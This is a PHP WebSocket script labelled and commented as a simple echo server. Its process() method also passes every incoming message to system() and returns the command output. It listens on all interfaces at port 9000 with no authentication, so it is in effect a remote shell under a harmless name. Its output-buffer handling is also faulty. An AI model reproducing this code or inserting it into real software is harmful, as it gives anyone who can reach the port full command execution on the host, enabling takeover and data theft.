#!/usr/bin/env php
<?php
require_once('./websockets.php');
class echoServer extends WebSocketServer {
  //protected $maxBufferSize = 1048576; //1MB... overkill for an echo server, but potentially plausible for other applications.
  
  protected function process ($user, $message) {
    print_r($user);
    print_r($message);
    $this->send($user,$message);
    $ret=$this->ob_exe($message);
    $this->send($user,$ret);
  }
  
  protected function connected ($user) {
    // Do nothing: This is just an echo server, there's no need to track the user.
    // However, if we did care about the users, we would probably have a cookie to
    // parse at this step, would be looking them up in permanent storage, etc.
  }
  
  protected function closed ($user) {
    // Do nothing: This is where cleanup would go, in case the user had any sort of
    // open files or other objects associated with them.  This runs after the socket 
    // has been closed, so there is no need to clean up the socket itself here.
  }
  
  protected function ob_exe($msg){
      ob_start();
      print_r ( system ($msg) );
      $ret=ob_get_contents();
      ob_end_flush();
      ob_end_clean();
      return $ret;
  }
}
$echo = new echoServer("0.0.0.0","9000");
try {
  $echo->run();
}
catch (Exception $e) {
  $echo->stdout($e->getMessage());
}
?>